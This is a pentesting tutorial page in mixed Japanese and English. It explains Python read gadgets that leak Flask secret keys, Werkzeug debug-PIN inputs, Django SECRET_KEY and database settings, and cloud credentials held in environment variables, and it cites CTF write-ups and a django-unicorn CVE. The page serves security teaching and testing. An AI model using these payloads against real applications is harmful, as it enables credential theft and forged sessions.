# Python 内部読み取りガジェット

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

さまざまな脆弱性（[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) や [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) など）は、**python の内部データを読み取れるがコードを実行することはできない**ことがあります。したがって、pentester はこれらの読み取り権限を最大限に活用して、**機密権限を取得し権限昇格する**必要があります。

### Flask - シークレットキーの読み取り

Flask アプリケーションのメインページには、おそらく **`app`** グローバルオブジェクトがあり、ここでこの **秘密鍵が設定されている**。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
この場合、[**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) の任意の gadget を使って **グローバルオブジェクトにアクセスする** だけでこのオブジェクトにアクセスできます。

脆弱性が別の python ファイルにある場合は、ファイルを辿ってメインのファイルに到達する gadget が必要で、そこで **グローバルオブジェクト `app.secret_key` にアクセス** して Flask の secret key を変更し、[**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) が可能になります。

次のような payload が使われます [from this writeup](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
このペイロードを使って **`app.secret_key` を変更する**（アプリ内での名前は異なる場合があります）ことで、より高い権限を持つ flask cookies に署名できるようになります。

### Werkzeug - machine_id and node uuid

[**Using these payload from this writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) を使うと、**machine_id** と **uuid** ノードにアクセスできるようになります。これらは、[**generate the Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) を生成するために必要な **主要なシークレット** で、**debug mode** が有効な場合に `/console` の python console にアクセスするために使用できます：
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> ウェブページに何らかの**エラー**を発生させることで、**サーバーの`app.py`へのローカルパス**を取得できる点に注意してください。**そのエラーがパスを教えてくれます。**

If the vulnerability is in a different python file, check the previous Flask trick to access the objects from the main python file.

### Django - SECRET_KEY and settings module

The Django settings object is cached in `sys.modules` once the application starts. With only read primitives you can leak the **`SECRET_KEY`**, database credentials or signing salts:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.DATABASES, a.SIGNING_BACKEND)
```
脆弱な gadget が別の module にある場合は、まず globals を走査する:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
キーが判明すれば、Flask と同様の方法で Django の signed cookies や tokens を偽造できます。

### ロード済みモジュール経由の環境変数 / cloud creds

多くの jails はどこかで `os` や `sys` をまだ import しています。到達可能な任意の関数の `__init__.__globals__` を悪用して、既に import されている `os` モジュールにピボットし、API tokens、cloud keys、flags を含む **環境変数** をダンプできます：
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
サブクラスインデックスがフィルタされている場合は、loaders を使用してください:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Environment variables are frequently the only secrets needed to move from read to full compromise (cloud IAM keys, database URLs, signing keys, etc.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` (<0.62.0) allowed **class pollution** via crafted component requests. Setting a property path such as `__init__.__globals__` let an attacker reach the component module globals and any imported modules (e.g. `settings`, `os`, `sys`). From there you can leak `SECRET_KEY`, `DATABASES` or service credentials without code execution. The exploit chain is purely read-based and uses the same dunder-gadget patterns as above.

### Gadget collections for chaining

Recent CTFs (e.g. jailCTF 2025) show reliable read chains built only with attribute access and subclass enumeration. Community-maintained lists such as [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) catalog hundreds of minimal gadgets you can combine to traverse from objects to `__globals__`, `sys.modules` and finally sensitive data. Use them to quickly adapt when indices or class names differ between Python minor versions.



## References

- [Wiz analysis of django-unicorn class pollution (CVE-2025-24370)](https://www.wiz.io/vulnerability-database/cve/cve-2025-24370)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
